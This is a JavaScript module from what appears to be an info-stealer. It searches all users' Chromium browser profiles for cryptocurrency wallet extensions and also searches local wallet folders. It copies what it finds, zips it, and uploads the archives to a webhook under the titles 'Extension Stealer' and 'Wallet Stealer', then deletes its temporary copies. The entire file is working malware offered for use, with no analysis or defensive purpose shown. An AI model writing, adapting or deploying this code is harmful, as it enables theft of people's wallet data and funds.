const fs = require('fs');
const path = require('path');
const os = require('os');

const browsersPaths = require('./../browsers/paths.js');
const walletsPaths = require('./paths.js');

const requests = require('./../../utils/requests/requests.js');
const fileutil = require('./../../utils/fileutil/fileutil.js');
const hardware = require('./../../utils/hardware/hardware.js');

const browsersProfiles = require('./../browsers/profiles.js');

const walletseExtensions = async (webhookUrl) => {
    const profiles = [];
    const users = await hardware.getUsers();

    for (const user of users) {
        for (const [name, relativePath] of Object.entries(browsersPaths.getChromiumBrowsers())) {
            const fullPath = path.join(user, relativePath);

            if (!fs.existsSync(fullPath) || !fs.lstatSync(fullPath).isDirectory()) {
                continue;
            }

            const browser = {
                name: name,
                path: fullPath,
                user: user.split(path.sep)[2]
            };

            let profilePaths = browsersProfiles.getChromiumProfiles(fullPath, name).map(profile => ({
                ...profile,
                browser: browser
            }));

            for (const profile of profilePaths) {
                profiles.push(profile);
            }
        }
    }

    if (profiles.length === 0) {
        return [];
    }

    const extensionsTempDir = path.join(os.tmpdir(), 'extensions-temp');
    if (!fs.existsSync(extensionsTempDir)) {
        fs.mkdirSync(extensionsTempDir, { recursive: true });
    }

    let extensionsFound = '';

    for (const profile of profiles) {
        for (const [name, relativePath] of Object.entries(walletsPaths.getExtension())) {
            const extensionPath = path.join(profile.path, relativePath);

            if (!fs.existsSync(extensionPath) || !fs.lstatSync(extensionPath).isDirectory()) {
                continue;
            }

            try {
                const extensionDestPath = path.join(extensionsTempDir, profile.browser.user, name);
                await fileutil.copy(extensionPath, extensionDestPath);
                extensionsFound += `\n✅ ${profile.browser.user} - ${name}`;
            } catch (err) {
                continue;
            }
        }
    }

    if (extensionsFound === '') {
        return;
    }

    if (extensionsFound.length > 4090) {
        extensionsFound = 'Numerous extensions to explore.';
    }

    const extensionsTempZip = path.join(os.tmpdir(), 'extensions.zip');
    try {
        await fileutil.zipDirectory({
            inputDir: extensionsTempDir,
            outputZip: extensionsTempZip
        });

        await requests.webhook(webhookUrl, {
            embeds: [{
                title: 'Extension Stealer',
                description: '```' + extensionsFound + '```',
            }],
        }, [extensionsTempZip]);

        const WishTempDir = fileutil.WishTempDir('extensions');
        await fileutil.copy(extensionsTempDir, WishTempDir);

        [extensionsTempDir, extensionsTempZip].forEach(async dir => {
            await fileutil.removeDir(dir);
        });
    } catch (error) {
        console.error(error);
    }
};

const walletsLocal = async (webhookUrl) => {
    const users = await hardware.getUsers();

    const walletsTempDir = path.join(os.tmpdir(), 'wallets-temp');
    if (!fs.existsSync(walletsTempDir)) {
        fs.mkdirSync(walletsTempDir, { recursive: true });
    };

    let walletsFound = '';

    for (const user of users) {
        for (const [name, relativePath] of Object.entries(walletsPaths.getWallets())) {
            const walletsPath = path.join(user, relativePath);

            if (!fs.existsSync(walletsPath) || !fs.lstatSync(walletsPath).isDirectory()) {
                continue;
            }

            try {
                const walletsDestPath = path.join(walletsTempDir, user.split(path.sep)[2], name);
                await fileutil.copy(walletsPath, walletsDestPath);
                walletsFound += `\n✅ ${user.split(path.sep)[2]} - ${name}`;
            } catch (err) {
                continue;
            }
        }
    }

    if (walletsFound === '') {
        return;
    }

    if (walletsFound.length > 4090) {
        walletsFound = 'Numerous wallets to explore.';
    }

    const walletsTempZip = path.join(os.tmpdir(), 'wallets.zip');
    try {
        await fileutil.zipDirectory({
            inputDir: walletsTempDir,
            outputZip: walletsTempZip
        });

        await requests.webhook(webhookUrl, {
            embeds: [{
                title: 'Wallet Stealer',
                description: '```' + walletsFound + '```',
            }],
        }, [walletsTempZip]);

        const WishTempDir = fileutil.WishTempDir('wallets');
        await fileutil.copy(walletsTempDir, WishTempDir);

        [walletsTempDir, walletsTempZip].forEach(async dir => {
            await fileutil.removeDir(dir);
        });
    } catch (error) {
        console.error(error);
    }
};

module.exports = async (webhookUrl) => {
    await walletseExtensions(webhookUrl);
    await walletsLocal(webhookUrl);
}
